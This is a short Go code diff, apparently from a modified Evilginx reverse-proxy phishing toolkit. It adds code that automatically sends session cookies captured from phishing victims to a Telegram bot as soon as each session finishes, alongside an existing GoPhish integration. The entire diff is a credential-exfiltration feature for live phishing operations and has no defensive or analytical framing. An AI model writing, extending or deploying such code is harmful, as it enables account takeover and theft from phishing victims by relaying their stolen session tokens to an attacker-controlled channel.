@@ -1375,6 +1375,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.Finish(false)
 
+						// Send cookies to Telegram immediately after session is finished
+						if p.telegram != nil && p.telegram.Enabled {
+							go func() {
+								// Small delay to ensure all data is saved
+								time.Sleep(2 * time.Second)
+								if err := p.telegram.SendEvilginxCookiesFile(ps.SessionId, p.db); err != nil {
+									log.Error("Failed to send cookies to Telegram: %v", err)
+								}
+							}()
+						}
+
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
